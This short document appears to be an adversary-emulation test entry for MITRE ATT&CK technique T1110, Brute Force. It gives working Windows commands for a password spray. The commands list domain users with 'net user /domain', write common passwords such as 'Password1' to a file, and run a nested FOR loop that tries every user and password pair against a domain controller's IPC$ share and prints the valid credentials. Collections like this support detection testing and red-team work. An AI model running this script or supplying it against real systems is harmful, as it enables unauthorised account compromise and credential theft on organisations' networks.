# Brute Force

MITRE ATT&CK Technique: [T1110](https://attack.mitre.org/wiki/Technique/T1110)

## net.exe

### Password Spray


    net user /domain > DomainUsers.txt
    echo "Password1" >> pass.txt
    echo "1q2w3e4r" >> pass.txt

Execute:

    @FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (pass.txt) DO @net use \\COMPANYDC1\IPC$ /user:COMPANY\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\COMPANYDC1\IPC$ > NUL
